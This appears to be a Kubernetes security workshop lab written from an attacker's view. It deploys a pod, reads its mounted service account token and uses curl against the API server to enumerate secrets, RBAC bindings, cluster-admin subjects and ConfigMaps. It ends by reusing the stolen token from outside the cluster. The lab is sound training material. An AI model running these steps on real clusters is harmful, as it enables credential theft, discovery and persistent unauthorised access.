# Accessing the Kubernetes API Server

From inside any pod, an attacker can discover and call the Kubernetes API server using the automatically mounted service account token, the cluster CA certificate, and the `KUBERNETES_SERVICE_HOST` environment variable that Kubernetes injects into every container.

## Description

The Kubernetes API server is the gateway to the cluster. Actions in the cluster are performed by sending various requests to the RESTful API. The status of the cluster — including all components deployed on it — can be retrieved via the API server. Attackers may send API requests to probe the cluster and retrieve information about containers, secrets, and other resources.

In addition, the Kubernetes API server can be used to query Role Based Access Control (RBAC) information such as Roles, ClusterRoles, RoleBindings, ClusterRoleBindings, and ServiceAccounts. Attackers may use this information to discover permissions associated with service accounts and progress toward their attack objectives.

Every pod receives three things that make API access trivial:

1. `KUBERNETES_SERVICE_HOST` and `KUBERNETES_SERVICE_PORT` environment variables pointing to the API server.
2. `/var/run/secrets/kubernetes.io/serviceaccount/token` — a bearer token for the pod's service account.
3. `/var/run/secrets/kubernetes.io/serviceaccount/ca.crt` — the cluster CA to verify the API server's TLS certificate.

## Prerequisites

- A running Kind cluster named `workshop-cluster`.
- `kubectl` installed and configured to connect to your cluster.

## Quick Start

### Step 1 - Deploy the attacker pod

Deploy a pod with a service account that has broad read permissions to simulate an over-privileged workload:

```bash
kubectl apply -f api-explorer.yaml
```

Wait for the pod to be ready:

```bash
kubectl get pod api-explorer
```

Expected output:

```
NAME           READY   STATUS    RESTARTS   AGE
api-explorer   1/1     Running   0          10s
```

### Step 2 - Exec into the pod

```bash
kubectl exec -it pod/api-explorer -- /bin/sh
```

Install curl and jq:

```bash
apk add --no-cache curl jq
```

### Step 3 - Discover the API server address

Kubernetes injects the API server's address as environment variables into every container:

```bash
env | grep KUBERNETES
```

Expected output:

```
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_SERVICE_PORT=443
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp
```

The API server is also always reachable via the DNS name `kubernetes.default.svc.cluster.local`.

### Step 4 - Set up environment variables for API calls

```bash
APISERVER=https://kubernetes.default.svc.cluster.local
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
```

Verify connectivity:

```bash
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/version
```

Expected output (version and platform vary by cluster):

```json
{
  "major": "1",
  "minor": "30",
  "gitVersion": "v1.30.2",
  "gitCommit": "39683505b630ff2121012f3c5b16215a1449d5ed",
  "gitTreeState": "clean",
  "buildDate": "2024-07-01T22:33:53Z",
  "goVersion": "go1.22.4",
  "compiler": "gc",
  "platform": "linux/arm64"
}
```

### Step 5 - Enumerate namespaces

```bash
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces \
  | jq '.items[].metadata.name'
```

Expected output (varies by cluster — at minimum the four system namespaces will appear):

```
"default"
"kube-node-lease"
"kube-public"
"kube-system"
```

### Step 6 - Enumerate pods across all namespaces

```bash
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/pods \
  | jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace, node: .spec.nodeName}'
```

Expected output (varies by cluster — you will see api-explorer plus all other running pods):

```json
{"name": "api-explorer", "namespace": "default", "node": "kind-worker"}
{"name": "coredns-xxxx", "namespace": "kube-system", "node": "kind-control-plane"}
```

### Step 7 - Enumerate secrets

```bash
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/secrets \
  | jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace, type: .type}'
```

### Step 8 - Enumerate service accounts and their tokens

```bash
# List all service accounts
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/serviceaccounts \
  | jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace}'
```

### Step 9 - Enumerate RBAC — discover privileged roles and bindings

Understanding RBAC is critical for lateral movement. Query all ClusterRoleBindings to find over-privileged accounts:

```bash
# List all ClusterRoleBindings
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings \
  | jq '.items[] | {name: .metadata.name, role: .roleRef.name, subjects: .subjects}'
```

Find any service account bound to `cluster-admin`:

```bash
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings \
  | jq '.items[] | select(.roleRef.name == "cluster-admin") | {name: .metadata.name, subjects: .subjects}'
```

List all ClusterRoles to understand what permissions exist:

```bash
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterroles \
  | jq '[.items[].metadata.name]'
```

### Step 10 - Check your own permissions

Use the SelfSubjectRulesReview API to enumerate everything the current service account is allowed to do:

```bash
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  -d "{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"$NAMESPACE\"}}" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  | jq '.status.resourceRules'
```

### Step 11 - Enumerate ConfigMaps for sensitive data

ConfigMaps often contain connection strings and configuration that developers intended to be non-sensitive:

```bash
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/configmaps \
  | jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace, keys: (.data // {} | keys)}'
```

### Step 12 - Access the API from outside the cluster using the stolen token

Exit the pod. From your workstation, you can use the service account token to access the API server directly — demonstrating persistent external access:

```bash
# Get the API server address
APISERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')

# Extract the service account token from the pod
TOKEN=$(kubectl exec pod/api-explorer -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Call the API server from outside the cluster
curl -sk \
  -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces" \
  | jq '.items[].metadata.name'
```

An attacker can store this token and use it for persistent access even after the original compromise vector is closed.

## Cleanup

```bash
kubectl delete -f api-explorer.yaml
```

## Resources

- [Kubernetes API Reference](https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.30/)
- [Accessing the Kubernetes API from a Pod](https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/)
- [Kubernetes RBAC Authorization](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)
- [MITRE ATT&CK - Discovery: Cloud Infrastructure Discovery](https://attack.mitre.org/techniques/T1580/)
- [MITRE ATT&CK - Credential Access: Kubernetes Secrets](https://attack.mitre.org/techniques/T1552/007/)
